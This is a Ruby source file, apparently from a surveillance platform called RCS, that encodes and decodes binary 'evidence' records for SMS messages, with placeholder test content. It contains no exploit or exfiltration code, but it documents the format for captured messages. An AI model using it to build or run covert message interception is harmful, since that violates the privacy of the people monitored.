require_relative 'common'
require_relative '../serializer'

module RCS
module SmsnewEvidence

  SMS_VERSION = 2010050501

  def content
    "test sms".to_utf16le_binary_null
  end

  def generate_content
    [ content ]
  end

  def additional_header
    header = StringIO.new
    header.write [SMS_VERSION].pack("l")
    header.write [1].pack("l") # incoming
    time = Time.now.getutc.to_filetime
    time.reverse!
    header.write time.pack('L*')
    header.write "+39123456789".ljust(16, "\x00")
    header.write "local".ljust(16, "\x00")
    header.string
  end

  def decode_additional_header(data)
    binary = StringIO.new data

    version = binary.read(4).unpack('l').first
    raise EvidenceDeserializeError.new("invalid log version for SMS") unless version == SMS_VERSION

    ret = Hash.new
    ret[:data] = Hash.new

    ret[:data][:incoming] = binary.read(4).unpack('l').first
    low, high = binary.read(8).unpack('L2')
    ret[:data][:time] = Time.from_filetime high, low
    ret[:data][:from] = binary.read(16).delete("\x00")
    ret[:data][:rcpt] = binary.read(16).delete("\x00")

    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:data][:type] = :sms

    stream = StringIO.new chunks.join

    info[:data][:content] = stream.read.utf16le_to_utf8

    puts info[:data].inspect

    yield info if block_given?
    :delete_raw
  end
end # ::SmsnewEvidence
end # ::RCS
